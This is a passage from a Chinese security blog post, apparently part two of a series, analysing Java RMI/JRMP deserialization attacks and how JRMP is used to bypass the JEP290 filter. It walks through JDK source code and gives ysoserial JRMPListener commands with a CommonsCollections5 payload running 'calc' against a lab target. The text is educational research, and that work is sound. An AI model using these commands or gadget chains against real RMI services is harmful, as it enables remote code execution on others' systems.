    <link href="http://lalajun.com/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/"/>
    <id>http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/</id>
    <published>2020-06-22T09:15:33.000Z</published>
    <updated>2020-06-24T03:28:43.510Z</updated>
    
    <content type="html"><![CDATA[<p>字数：1w5</p><p>推荐阅读时间：&gt;2h</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再看下RMI反序列化攻击的总结图：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p><p>如果觉得有什么出入，喷就完事了；<br>同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃…..</del></p><p>咳…在上篇中已经讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，得出了部分结论。</p><p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p><p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank" rel="noopener">github</a>。</p><p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。</p><h2 id="利用JRMP反序列化绕过JEP290"><a href="#利用JRMP反序列化绕过JEP290" class="headerlink" title="利用JRMP反序列化绕过JEP290"></a>利用JRMP反序列化绕过JEP290</h2><p>在上篇中我们所有攻击方式都给JEP290给干掉了，当然出了参数利用的方式，但是那种利用局限性太强了。来看看绕过JEP290的攻击方式。</p><p>先进行攻击演示：</p><ol><li>使用github中的<code>ServerandRegister.java</code>作为受害者靶机</li><li>运行<code>java -cp F:\BanZ\java\ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 &quot;calc&quot;</code>作为攻击者自实现的JRMP服务端</li><li>运行github中的<code>Bypass290.java</code>作为攻击代码</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1782mvi0j321b0udwrj.jpg" alt="绕过JEP290-bind命令执行.png"></p><p>再来讲绕过原理的前置知识：</p><h3 id="JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener"><a href="#JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener" class="headerlink" title="JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)"></a>JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</h3><blockquote><p>这其实就是ysoserial.exploit.JRMPListener模块的攻击逻辑</p></blockquote><blockquote><p>其实之前标题为DGC服务端打DGC客户端，在别的文章评论区如此说的时候，被<a href="https://www.anquanke.com/post/id/204740#h2-15" target="_blank" rel="noopener">老哥</a>指出来不对：这里的漏洞触发跟DGC没关系。</p><p>实际去仔细看了调用栈的确不经过DGC，由于自己看的时候是从<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>跳转进去的所以就当成DGC层。</p><p>实际上应该归为JRMP层，JRMP是DGC和RMI底层通讯层，DGC和RMI的最终调用都回到JRMP这一层来，但是这种理论归属知道个大概就好，其实我也不是很确定QAQ。</p></blockquote><p>我们之前在看DGC层反序列化的时候，下的客户端断点是在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>，然后回退到调用栈的dirty方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span></span><br><span class="line">            RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取连接的输入流</span></span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                <span class="comment">//***DGC客户端攻击DGC服务端的payload写入处***</span></span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">super</span>.ref.invoke(var5);</span><br></pre></td></tr></table></figure><p>dirty方法中通过<code>super.ref.invoke(var5);</code>进入<code>sun.rmi.server.UnicastRef#invoke</code></p><p>在这里进行了</p><ol><li>发送了之前处理好的序列化数据包</li><li>处理了服务端的报错返回。而<strong>反序列化问题正是出现在这里</strong></li></ol><p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//写个日志，不管</span></span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">"execute call"</span>);</span><br><span class="line"> <span class="comment">//跟进此处</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">        <span class="comment">//...省略一堆报错处理</span></span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read result header</span></span><br><span class="line">        DGCAckHandler ackHandler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//...这里发包和接受返回状态returnType和返回包数据流in</span></span><br><span class="line">            returnType = in.readByte();  <span class="comment">//1. 反序列化一个returnType</span></span><br><span class="line">            in.readID();        <span class="comment">// 2. 反序列化一个id for DGC acknowledgement</span></span><br><span class="line">            <span class="comment">//具体细节比较复杂不看了</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">            <span class="comment">//..略..</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理returnType返回状态</span></span><br><span class="line">        <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">        <span class="comment">//这是常量1</span></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//这是常量2</span></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">            Object ex;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//3. 从服务端返回数据流in中读取，并反序列化</span></span><br><span class="line">                <span class="comment">//***漏洞触发点***</span></span><br><span class="line">                ex = in.readObject();</span><br><span class="line">                <span class="comment">//省略之后代码</span></span><br></pre></td></tr></table></figure><p>JRMP客户端反序列化顺序：</p><ol><li>反序列化服务端给的returnType</li><li>反序列化服务端给的一个ID</li><li>反序列化服务端给的报错信息</li></ol><blockquote><p>小问题：为啥一定要利用报错信息写payload，前两个不可以么？</p><p>当然不可以，readObject才行，不懂的话….. 不懂你也看不到这里。。打扰了</p></blockquote><blockquote><p>此外自己在看的时候发现了一个自己模糊的问题：JAVA反序列化序列化 是队列形式的还是栈形式的？</p><p>即：out.writeObject(a)；out.writeObject(a)；out.readObejct()的结果是a还是b</p><p>是a，队列形式</p></blockquote><p>那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的（我们已经知道了大概是一个报错信息处）</p><p>这里网上的文章大多是直接拿yso exploit的JRMPlistener攻击代码来看了，那个代码是直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。（虽然这个问题对于实际攻击利用没有太大意义，还是来看下）</p><p>可以看到上面客户端代码对于服务端传输过来的<code>returnType</code>判断为<code>TransportConstants.ExceptionalReturn</code>才会进入反序列化流程。那么我们来全局搜索<code>TransportConstants.ExceptionalReturn</code>就可以找到服务端在哪里写入的了。</p><p>发现服务端的代码就在同个java文件下<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectOutput <span class="title">getResultStream</span><span class="params">(<span class="keyword">boolean</span> success)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (resultStarted)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"result already in progress"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        resultStarted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    DataOutputStream wr = <span class="keyword">new</span> DataOutputStream(conn.getOutputStream());</span><br><span class="line">    wr.writeByte(TransportConstants.Return);</span><br><span class="line">    getOutputStream(<span class="keyword">true</span>);  </span><br><span class="line">    <span class="comment">//success为false，进入我们的分支</span></span><br><span class="line">    <span class="keyword">if</span> (success)  </span><br><span class="line">        out.writeByte(TransportConstants.NormalReturn);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//*******这里第一个序列化returnType*******</span></span><br><span class="line">        out.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">    <span class="comment">//第二个序列化一个ID</span></span><br><span class="line">    out.writeID();          <span class="comment">// write id for gcAck</span></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里反序列化了两个前置的参数，这个函数之后就是payload处的写入，全局搜索该函数的引用处（参数要false的）：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178eusk1j30w10b6t9q.jpg" alt="DCGClient-1.png"></p><p>前两处在<code>sun.rmi.server.UnicastServerRef#dispatch</code>和<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>中，但代码一样，写入了报错信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里出来</span></span><br><span class="line">ObjectOutput out = call.getResultStream(<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">if</span> (e <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">    e = <span class="keyword">new</span> ServerError(</span><br><span class="line">        <span class="string">"Error occurred in server thread"</span>, (Error) e);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">    e = <span class="keyword">new</span> ServerException(</span><br><span class="line">        <span class="string">"RemoteException occurred in server thread"</span>,</span><br><span class="line">        (Exception) e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (suppressStackTraces) &#123;</span><br><span class="line">    clearStackTraces(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第三处序列化：序列化写入报错信息，也就是payload插入处</span></span><br><span class="line">out.writeObject(e);</span><br></pre></td></tr></table></figure><p>后一处在<code>sun.rmi.transport.Transport#serviceCall</code>中，清空了调用栈，然后写入了报错信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutput out = call.getResultStream(<span class="keyword">false</span>);</span><br><span class="line">UnicastServerRef.clearStackTraces(e);</span><br><span class="line"><span class="comment">//第三处序列化：序列化写入报错信息，也就是payload插入处</span></span><br><span class="line">out.writeObject(e);</span><br><span class="line">call.releaseOutputStream();</span><br></pre></td></tr></table></figure><p>那么<strong>服务端在三处地方可以写入payload</strong>去发起对于客户端的请求（其实应该还有更多地方，比如我们下断点找过来的路径就不是这三个的任何一个），找到之后我们就会发现，我们没法去利用原生的payload插入处，去插入payload。因为他们都是写入了报错信息，我们没法去控制。</p><p>那么就只有自实现拼接出一个JRMP服务端，来发送给JRMP客户端一个序列化数据，这就是<strong>YSOSERIAL-exploit-JRMPListener</strong>做的事情。</p><p>但是我们的这里的重点不是研究<strong>JRMPListener</strong>，所以不详细说明了</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><strong>我们可以通过github里的JRMPClient和ysoserial来复现一下JRMP服务端打客户端的过程。</strong></p><p>起一个JRMP服务端<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;</code></p><p>这个exploit会对任何请求回应一个响应包，其中报错信息被替换成了CC5链的Object payload。</p><p>然后客户端运行<code>JRMPClient.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178plaw1j317617hnav.jpg" alt="JRMP-listener.png"></p><p>成功，而且非常有趣，我们测试的JDK是在JEP290（8u121）修复之后！</p><p>这说明<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制！</strong></p><p><strong>为什么？</strong></p><p>因为之前也说到JEP290默认只为<strong>RMI注册表</strong>（RMI Register层）和<strong>RMI分布式垃圾收集器</strong>（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。所以可以攻击执行payload</p><p>那么有没有可能我们把这个可以绕过JEP290的攻击方式与几种之前被白名单拦截的攻击路径结合呢？</p><h3 id="与RMI服务端反序列化攻击RMI注册端-Bind结合"><a href="#与RMI服务端反序列化攻击RMI注册端-Bind结合" class="headerlink" title="与RMI服务端反序列化攻击RMI注册端-Bind结合"></a>与RMI服务端反序列化攻击RMI注册端-Bind结合</h3><p>我们的期待中的攻击流程如下（偷一张老外大佬的图）：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179a6qkrj31r50f5whh.jpg" alt="绕过jep290-流程.png"></p><p><strong>上面一条线</strong><code>registry,bind(name,object)</code>是我们RMI服务端bind攻击RMI注册端的攻击路线，但是由于JEP290加入了反序列化过滤器，我们的诸多利用链比如CC被白名单限制失效了。具体细节如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数组最大长度maxarray=<span class="number">1000000</span>;</span><br><span class="line">调用栈最大深度maxdepth=<span class="number">20</span>;</span><br><span class="line">白名单要求如下：</span><br><span class="line">java.lang.String;</span><br><span class="line">java.lang.Number;</span><br><span class="line">java.lang.reflect.Proxy;</span><br><span class="line">java.rmi.Remote;</span><br><span class="line">sun.rmi.server.UnicastRef;</span><br><span class="line">sun.rmi.server.RMIClientSocketFactory;</span><br><span class="line">sun.rmi.server.RMIServerSocketFactory;</span><br><span class="line">java.rmi.activation.ActivationID;</span><br><span class="line">java.rmi.server.UID</span><br></pre></td></tr></table></figure><p>而<strong>下面两条线</strong>对应着我们刚才分析的<strong>JRMP服务端打JRMP客户端</strong>的过程：</p><ol><li>要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）</li><li>我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。</li><li>由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。</li></ol><p>那么显而易见这个攻击组合中<strong>唯一缺失的板块</strong>就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成<strong>让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求</strong>，从而完成一整个攻击链的衔接，这需要我们去寻<strong>找一个所有对象都在白名单中的Gadget</strong>去完成这一任务。</p><blockquote><p> 细想这个过程，会发现这个过程跟fastjson的JNDI注入攻击模式很相似，用一个payload去诱导目标服务器发起一个外部连接，连接到我们控制的恶意服务，恶意服务再去返回payload从而在服务器上完成命令执行。</p><p>它也跟我们所说的内网渗透中的免杀平台很像，我们只需要免杀平台免杀（对应JRMP攻击链逃过JEP290），然后外部命令都在免杀平台（通过JRMP攻击链）上执行。</p></blockquote><p>理顺一下我们的目标：</p><ol><li>我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。</li><li>在找到这个Gadget之后，我们需要进一步将它封装进入<code>register.bind(String,Remote)</code>中。（为了满足客户端的格式需求）</li></ol><p>那么我们先来第一步：找Gadget。</p><p>假如让我们自己真的从零开始找这个Gadget，我们应该先找出所有会向服务器发起JRMP请求的最底层方法，然后向上看何处调用了这个方法来进行一层层逆推，直到找到一个对象的反序列化入口（比如readobject）。那么再从反序列化入口反过来拎起来就是一个Gadget。</p><p>但是在看别人的Gadget的时候就从反序列化口子开始看便于理解。</p><h4 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h4><p>Ysoserial中的payloads-JRMPClient就是一个可以完成JRMP服务器发起JRMP连接的调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * UnicastRef.newCall(RemoteObject, Operation[], int, long)（！！JRMP请求的发送处！！）</span></span><br><span class="line"><span class="comment"> * DGCImpl_Stub.dirty(ObjID[], long, Lease)（这里是我们上面JRMP服务端打客户端，客户端的反序列化触发处）</span></span><br><span class="line"><span class="comment"> * DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long)</span></span><br><span class="line"><span class="comment"> * DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;)</span></span><br><span class="line"><span class="comment"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span></span><br><span class="line"><span class="comment"> ------这里实际上不是一个连贯的调用栈,之后说明-----</span></span><br><span class="line"><span class="comment"> * LiveRef.read(ObjectInput, boolean)</span></span><br><span class="line"><span class="comment"> * UnicastRef.readExternal(ObjectInput)（！！反序列化的入口！！）</span></span><br></pre></td></tr></table></figure><p>可能有的同学对于<code>UnicastRef.readExternal()</code>作为反序列化的入口有点疑惑，其实我们在 <strong>JAVA反序列化-基础</strong> 中提到过这个。反序列化的入口其实不止readobject()，还有readExternal()，只不过后者稍微少见点。</p><p>在实际触发的时候，这个触发过程其实不是我们常见的readobject进来一路向下就直接完成触发的调用栈，它其实分为两部分</p><ol><li>readObject()：组装填入ref</li><li>releaseInputStream()：统一处理ref</li></ol><p>看bind的反序列化过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var9 = var2.getInputStream();<span class="comment">//var2是我们的输入流</span></span><br><span class="line">    var7 = (String)var9.readObject();<span class="comment">//略过</span></span><br><span class="line">    <span class="comment">//payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal</span></span><br><span class="line">    <span class="comment">//在其中完成了ref的填装</span></span><br><span class="line">    var80 = (Remote)var9.readObject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var77);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//在这里处理ref的时候才真正完成了触发</span></span><br><span class="line">var2.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说实际上<strong>JRMP服务器发起JRMP连接</strong>的时候是在<code>var2.releaseInputStream();</code>的语句中。</p><p>我们从<code>var9.readObject();</code>反序列化入口开始跟一遍：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179gvpt6j31d10yj0yx.jpg" alt="纠错第一步.png"></p><p><code>sun.rmi.server.UnicastRef#readExternal</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ref = LiveRef.read(in, <span class="keyword">false</span>);<span class="comment">//---进入此处----</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.LiveRef#read</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title">read</span><span class="params">(ObjectInput in, <span class="keyword">boolean</span> useNewFormat)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       Endpoint ep;</span><br><span class="line">       ObjID id;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 从输入流中读取endpoint, id和result flag</span></span><br><span class="line">       <span class="comment">// 一个固定的格式版本判断，根据JDK版本有关</span></span><br><span class="line">       <span class="keyword">if</span> (useNewFormat) &#123;</span><br><span class="line">           ep = TCPEndpoint.read(in);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//读取</span></span><br><span class="line">           ep = TCPEndpoint.readHostPortFormat(in);</span><br><span class="line">       &#125;</span><br><span class="line">       id = ObjID.read(in);</span><br><span class="line">       <span class="keyword">boolean</span> isResultStream = in.readBoolean();</span><br><span class="line"><span class="comment">//恢复一个LiveRef对象(可以理解为一个连接对象)</span></span><br><span class="line"><span class="comment">//此处可以由我们的序列化对象进行指定。</span></span><br><span class="line">       LiveRef ref = <span class="keyword">new</span> LiveRef(id, ep, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">//判断输入流in是不是已经是一个对象流了，这里都会为true</span></span><br><span class="line">       <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">           ConnectionInputStream stream = (ConnectionInputStream)in;</span><br><span class="line">           <span class="comment">// 保存ref以在所有参数/返回都被解析后再发送"dirty"调用。</span></span><br><span class="line">           stream.saveRef(ref);</span><br><span class="line">           <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">               stream.setAckNeeded();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----</span></span><br><span class="line">           DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> LiveRef[] &#123; ref &#125;));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ref;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们会进入<code>stream.saveRef(ref);</code>中，将ref填入流中的<code>incomingRefTable</code>字段，再之后统一解析。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179nw4ikj31gs0q7dja.jpg" alt="纠错01.png"></p><p>然后readobject就执行完了，进入第二步 <strong>releaseInputStream 触发</strong></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179tjfqgj31nf0twn3i.jpg" alt="纠错第二步.png"></p><p><code>sun.rmi.transport.StreamRemoteCall#releaseInputStream</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.in != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line">            <span class="comment">//进入此处，统一处理去DGC注册之前readobject解析出来的ref</span></span><br><span class="line">            <span class="keyword">this</span>.in.registerRefs();</span><br><span class="line">            <span class="keyword">this</span>.in.done(<span class="keyword">this</span>.conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.conn.releaseInputStream();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.in = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span 